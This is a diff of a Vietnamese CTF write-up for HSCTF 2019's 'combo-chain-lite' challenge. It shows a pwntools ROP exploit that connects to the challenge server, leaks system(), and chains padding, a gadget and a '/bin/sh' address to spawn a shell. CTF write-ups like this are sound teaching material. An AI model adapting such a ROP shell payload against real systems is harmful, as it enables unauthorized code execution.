@@ -53,7 +53,6 @@ combo-chain-lite : 0x403051 --> 0x68732f6e69622f ('/bin/sh')
 {% endhighlight %}
 
 
-
   ![combo-chain-lite-stack.png]({{site.baseurl}}/img/ctf/HSCTF/2019/combo-chain-lite-stack.png)
 
 Đoạn code exploit của mình:
@@ -66,11 +65,10 @@ from pwn import *
 rm = remote("pwn.hsctf.com", 3131)
 
 padding = "AAA%AAsAABAA$AAn" #16 ki tu (random pattern)
-bin_addr = p64(0x402051) #hoac 0x403051 /bin/sh string
 rop_addr = p64(0x0000000000401273)
+bin_addr = p64(0x402051) #hoac 0x403051 /bin/sh string
 sys_addr = p64(int(rm.recv().rsplit(': ')[1], 16)) 
 
-#print sys_addr #sys_addr
 payload = padding + rop_addr  + bin_addr + sys_addr
 print payload
 rm.recv()
